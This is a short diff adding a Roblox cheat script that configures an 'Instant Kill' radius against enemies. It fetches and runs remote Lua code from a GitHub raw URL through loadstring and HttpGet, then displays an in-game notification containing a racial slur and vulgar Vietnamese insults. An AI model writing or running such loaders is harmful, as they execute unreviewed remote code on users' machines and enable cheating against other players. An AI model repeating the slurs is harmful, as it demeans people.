@@ -1,0 +1,11 @@
+getgenv().Config = {
+    ["Folder Mon"] = "Enemy",
+    ["Instant Kill"] = true,
+    ["Radius"] = 15
+}
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Godmey/Inkillallmap/main/inkill.lua'))()
+game.StarterGui:SetCore("SendNotification", {
+Title = "suck kaizn dick nigga",
+Text = "chúc bạn 1 ngày như cặc",
+Duration = 100,
+})
